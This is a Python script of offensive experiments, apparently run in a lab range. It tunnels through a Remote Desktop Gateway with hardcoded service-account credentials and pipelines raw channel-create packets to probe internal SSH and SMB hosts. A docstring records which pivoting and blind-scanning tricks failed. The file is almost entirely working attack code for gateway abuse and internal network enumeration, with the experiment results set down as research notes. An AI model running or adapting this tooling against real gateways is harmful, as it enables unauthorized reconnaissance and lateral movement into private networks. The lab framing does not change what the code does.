#!/usr/bin/env python3
"""Pipelining & cancellation experiments for blind scanning (authorized lab).

Known: ANY 23005-denial RSTs the tunnel (denialcheck S1-S4). Two possible
rescues for 1-push blind /24:

RESULTS (2026-11-18, svcaccount): ALL DEAD.
  S6  pipelined dead+live: dead create answered 23005 at 21.0s, tunnel RST'd;
      live create NEVER answered. Gateway serves creates strictly in order.
  S6b batch of 10 (2 live, 8 dead): 1/10 responses — first denial kills the
      tunnel, remaining 9 creates never served.
  S7  create(dead)+immediate CLOSE_CHANNEL: denial still arrives 21s, RST.
      CLOSE does NOT cancel a pending connect.
  S8  create(dead), 3s, close: close "reply" IS the 23005 (18s), then RST.
  S9  two LIVE creates pipelined: first granted 0.0s, second create RST'd
      the tunnel instantly (data write -> reset). One outstanding create max,
      even live+live.
CONCLUSION: blind scanning on one push is impossible at the wire level —
every dead probe costs the tunnel, and the tunnel is the push. Enumeration
must pivot through an already-granted live channel (app-layer).

  S6  pipelined creates: dead-IP create, then IMMEDIATELY a live create —
      does the gateway serve both? order? does the live grant arrive before
      the 21s denial RST?
  S6b batch of 10 (mix live/dead) pipelined — how many responses arrive?
  S7  cancel: create(dead) + immediate CLOSE_CHANNEL — does the gateway
      abort the pending connect and NOT kill the tunnel?
  S8  cancel after 3s wait, then live create — tunnel reusable?
  S9  two LIVE creates back-to-back (pipelined grants): do 2 grants coexist?
      does data demux at all?
"""
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/kali/workspace/RDetour")
from rdetour import RDGTunnel, pkt, u32, smb2_negotiate  # noqa: E402

GW = "ecorp-rds.ecorp.local"
DEAD = "192.168.15.99"
LIVE_SSH = ("192.168.15.152", 22)
LIVE_SMB = ("192.168.15.40", 445)


def fresh(name):
    t = RDGTunnel(GW, user="svcaccount", password="svcaccount",
                  domain="ECORP.local", verbose=False, connect_timeout=10)
    t.establish(auth_timeout=8)
    print(f"[{name}] tunnel up", flush=True)
    return t


def create_raw(t, host, port):
    name = host.encode("utf-16-le") + b"\x00\x00"
    t.send_packet(pkt(0x8, b"\x01\x00" + struct.pack("<HHH", port, 3,
                                                     len(name)) + name))


def read_resp(t, timeout, tag):
    t0 = time.time()
    p = t.recv_packet(timeout=timeout)
    dt = time.time() - t0
    if p is None:
        print(f"[{tag}] NONE ({dt:.1f}s)", flush=True)
        return None
    hr = struct.unpack("<I", p[1][0:4])[0] if p[0] == 0x9 else None
    print(f"[{tag}] pkt 0x{p[0]:x} hr={hr and '0x%08x' % hr} ({dt:.1f}s)",
          flush=True)
    return p


def alive(t, tag):
    try:
        create_raw(t, *LIVE_SSH)
        p = read_resp(t, 6, tag + "/probe")
        return p is not None and p[0] == 0x9 and \
            struct.unpack("<I", p[1][0:4])[0] == 0
    except (ConnectionError, OSError) as e:
        print(f"[{tag}] DEAD {e!r}", flush=True)
        return False


def s6():
    print("=== S6: pipelined dead + live ===", flush=True)
    t = fresh("S6")
    t0 = time.time()
    create_raw(t, DEAD, 445)
    create_raw(t, *LIVE_SSH)
    r1 = read_resp(t, 30, "S6/r1")
    r2 = read_resp(t, 10, "S6/r2") if r1 else None
    print(f"[S6] total {time.time()-t0:.1f}s", flush=True)
    t.close()


def s6b():
    print("=== S6b: batch of 10 pipelined ===", flush=True)
    t = fresh("S6b")
    targets = [(DEAD, 445), LIVE_SSH, ("192.168.15.98", 445), LIVE_SMB,
               ("192.168.15.97", 445), ("192.168.15.47", 445),
               ("192.168.15.96", 445), ("192.168.15.41", 445),
               ("192.168.15.95", 445), ("192.168.15.42", 445)]
    t0 = time.time()
    for h, p_ in targets:
        create_raw(t, h, p_)
    got = 0
    try:
        for i in range(len(targets)):
            p = read_resp(t, 35, f"S6b/r{i+1}")
            if p is None:
                break
            got += 1
    except (ConnectionError, OSError) as e:
        print(f"[S6b] connection died after {got} responses: {e!r}",
              flush=True)
    print(f"[S6b] {got}/{len(targets)} responses in {time.time()-t0:.1f}s",
          flush=True)
    t.close()


def s7():
    print("=== S7: create(dead) + immediate CLOSE_CHANNEL ===", flush=True)
    t = fresh("S7")
    create_raw(t, DEAD, 445)
    t.send_packet(pkt(0x10, u32(0)))
    # read up to 2 packets in 30s: any combo of 0x9(23005)/0x11
    for i in (1, 2):
        try:
            read_resp(t, 30, f"S7/r{i}")
        except (ConnectionError, OSError) as e:
            print(f"[S7] died at r{i}: {e!r}", flush=True)
            break
    alive(t, "S7")
    t.close()


def s8():
    print("=== S8: create(dead), 3s, close, then live ===", flush=True)
    t = fresh("S8")
    create_raw(t, DEAD, 445)
    time.sleep(3)
    t.send_packet(pkt(0x10, u32(0)))
    try:
        read_resp(t, 30, "S8/close-reply")
    except (ConnectionError, OSError) as e:
        print(f"[S8] died: {e!r}", flush=True)
        t.close()
        return
    alive(t, "S8")
    t.close()


def s9():
    print("=== S9: two LIVE creates pipelined ===", flush=True)
    t = fresh("S9")
    create_raw(t, *LIVE_SSH)
    create_raw(t, *LIVE_SMB)
    read_resp(t, 8, "S9/r1")
    read_resp(t, 8, "S9/r2")
    # try data: write an SMB negotiate — where does the response go?
    try:
        t.write(smb2_negotiate())
        read_resp(t, 8, "S9/data-resp")
    except (ConnectionError, OSError) as e:
        print(f"[S9] data died: {e!r}", flush=True)
    t.close()


if __name__ == "__main__":
    socket.setdefaulttimeout(20)
    for fn in (s6, s6b, s7, s8, s9):
        try:
            fn()
        except Exception as e:
            print(f"!!! {fn.__name__} aborted: {e!r}", flush=True)
